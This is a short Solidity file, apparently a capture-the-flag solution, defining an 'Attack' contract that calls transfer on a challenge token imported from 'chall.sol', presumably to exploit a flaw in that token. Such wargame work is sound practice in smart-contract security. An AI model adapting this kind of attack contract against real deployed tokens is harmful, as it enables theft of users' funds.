// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import './chall.sol';
contract Attack {

  Token public token;
  constructor(address _token) public {
    token = Token(_token);
  }
  function attack(address to, uint value) public {
    token.transfer(to, value);
  }
}